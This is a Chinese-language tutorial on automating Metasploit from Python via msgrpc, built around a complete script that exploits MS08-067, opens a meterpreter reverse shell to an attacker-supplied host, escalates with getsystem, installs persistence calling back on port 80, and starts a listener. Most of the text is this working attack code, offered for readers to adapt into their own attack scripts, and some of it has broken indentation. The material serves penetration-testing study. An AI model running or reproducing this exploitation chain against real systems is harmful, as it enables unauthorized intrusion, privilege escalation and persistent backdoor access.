# Python 版的 Metasploit

## Python 版的 Metasploit

pymsf 模块是 Spiderlabs 实现的一个 python 与 Metasploit 的 msgrpc 通信的 python 模块,但首先你需要先启动 msgrpc 服务,命令如下:

```py
load msgrpc Pass=<password> 
```

与 msgrpc 进行通信其实就是与 msfconsole 进行通信，首先你需要创建一个 msfrpc 的类,登录到 msgrpc 服务器并且创建一个虚拟的终端,然后你就可以在你创建的虚拟终端上面执行多个命令的字符串.你可以调用模块的方法与 console.write 执行命令,并且通过"console.read"从虚拟终端上面读取输入的值.这篇文章将演示如何使用 pymsf 模块并且如何开发出一个完整的脚本.

这里有一个函数它创建了一个 msfrpc 实例,登录到 msgrpc 服务器,并且创建了一个虚拟终端.

```py
def sploiter(RHOST, LHOST, LPORT, session):
    client = msfrpc.Msfrpc({})
    client.login('msf', '123')
    ress = client.call('console.create')
    console_id = ress['id'] 
```

下一步就是实现把多个字符串发给虚拟终端,通过 console.write 和 console.read 在虚拟终端显示与读取:

```py
## Exploit MS08-067 ##
commands = """use exploit/windows/smb/ms08_067_netapi
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST """+RHOST+"""
set LHOST """+LHOST+"""
set LPORT """+LPORT+"""
set ExitOnSession false
exploit -z
"""
print "[+] Exploiting MS08-067 on: "+RHOST
client.call('console.write',[console_id,commands])
res = client.call('console.read',[console_id])
result = res['data'].split('\n') 
```

上面的这一小段代码创建了一个 MSF 的资源文件,这样你就可以通过"resoucen <pathtofile class="calibre11">"命令去执行指定文件里面中一系列的命令.下面我们将通过"getsystem"命令把这个文件的提权,建立一个后门打开 80 端口来转发.并且永久的运行.最后上传我们的漏洞 exp 并且在命令模式下面悄悄的安装:</pathtofile>

```py
# 这个函数会创建一个 MSF .rc 文件
def builder(RHOST, LHOST, LPORT):
     post = open('/tmp/smbpost.rc', 'w')
     bat = open('/tmp/ms08067_install.bat', 'w')

     postcomms = """getsystem
run persistence -S -U -X -i 10 -p 80 -r """+LHOST+"""
cd c:\\
upload /tmp/ms08067_patch.exe c:\\
upload /tmp/ms08067_install.bat c:\\
execute -f ms08067_install.bat
"""
     batcomm = "ms08067_patch.exe /quiet"
     post.write(postcomms); bat.write(batcomm)
     post.close(); bat.close() 
```

通过上面的那段代码,将会创建一个.rc 的文件.通过 msf 模块“post/multi/gather/run_console_rc_file”在当前的 meterpreter 会话中运行生成的文件,并且通过 console.write 命令从虚拟终端写入数据,通过 console.read 命令来回显返回内容:

```py
## 运行生成的 exp ##
runPost = """use post/multi/gather/run_console_rc_file
set RESOURCE /tmp/smbpost.rc
set SESSION """+session+"""
exploit
"""
     print "[+] Running post-exploit script on: "+RHOST
     client.call('console.write',[console_id,runPost])
     rres = client.call('console.read',[console_id])
## Setup Listener for presistent connection back over port 80 ##
     sleep(10)
     listen = """use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 80
set LHOST """+LHOST+"""
exploit
"""
print "[+] Setting up listener on: "+LHOST+":80"
client.call('console.write',[console_id,listen])
lres = client.call('console.read',[console_id])
print lres 
```

上面代码中的变量(RHOST, LHOST, LPORT 等)都是通过 optparse 模块从命令终端输入的,完整的脚本托管在 github 上面,有时候你需要知道脚本的生成的地方都是静态地址,不会在其他的目录生成,例如 ms08067 的补丁就会在你的/tmp/目录下面。大家只要知道基础然后对下面的代码进行一定的修改就可以编程一个属于你自己的 msf 自动化攻击脚本,我们建议通过博客里面发表的一些简单的例子出发,然后自己写一个 msf 攻击脚本:

```py
import os, msfrpc, optparse, sys, subprocess
from time import sleep

# Function to create the MSF .rc files
def builder(RHOST, LHOST, LPORT):
     post = open('/tmp/smbpost.rc', 'w')
     bat = open('/tmp/ms08067_install.bat', 'w')

     postcomms = """getsystem
run persistence -S -U -X -i 10 -p 80 -r """+LHOST+"""
cd c:\\
upload /tmp/ms08067_patch.exe c:\\
upload /tmp/ms08067_install.bat c:\\
execute -f ms08067_install.bat
"""
     batcomm = "ms08067_patch.exe /quiet"
     post.write(postcomms); bat.write(batcomm)
     post.close(); bat.close()

# Exploits the chain of rc files to exploit MS08-067, setup persistence, and patch
def sploiter(RHOST, LHOST, LPORT, session):
     client = msfrpc.Msfrpc({})
        client.login('msf', '123')
        ress = client.call('console.create')
        console_id = ress['id']

## Exploit MS08-067 ##
     commands = """use exploit/windows/smb/ms08_067_netapi
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST """+RHOST+"""
set LHOST """+LHOST+"""
set LPORT """+LPORT+"""
set ExitOnSession false
exploit -z
"""
     print "[+] Exploiting MS08-067 on: "+RHOST
     client.call('console.write',[console_id,commands])
     res = client.call('console.read',[console_id])
     result = res['data'].split('\n')

## Run Post-exploit script ##
     runPost = """use post/multi/gather/run_console_rc_file
set RESOURCE /tmp/smbpost.rc
set SESSION """+session+"""
exploit
"""
     print "[+] Running post-exploit script on: "+RHOST
     client.call('console.write',[console_id,runPost])
     rres = client.call('console.read',[console_id])
## Setup Listener for presistent connection back over port 80 ##
     sleep(10)
     listen = """use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 80
set LHOST """+LHOST+"""
exploit
"""
     print "[+] Setting up listener on: "+LHOST+":80"
     client.call('console.write',[console_id,listen])
     lres = client.call('console.read',[console_id])
     print lres

def main():
        parser = optparse.OptionParser(sys.argv[0] +\
        ' -p LPORT -r RHOST -l LHOST')
        parser.add_option('-p', dest='LPORT', type='string', \
        help ='specify a port to listen on')
        parser.add_option('-r', dest='RHOST', type='string', \
        help='Specify a remote host')
        parser.add_option('-l', dest='LHOST', type='string', \
        help='Specify a local host')
     parser.add_option('-s', dest='session', type='string', \
        help ='specify session ID')
     (options, args) = parser.parse_args()
     session=options.session
     RHOST=options.RHOST; LHOST=options.LHOST; LPORT=options.LPORT

     if (RHOST == None) and (LPORT == None) and (LHOST == None):
                print parser.usage
                sys.exit(0)

     builder(RHOST, LHOST, LPORT)
     sploiter(RHOST, LHOST, LPORT, session)

if __name__ == "__main__":
      main() 
```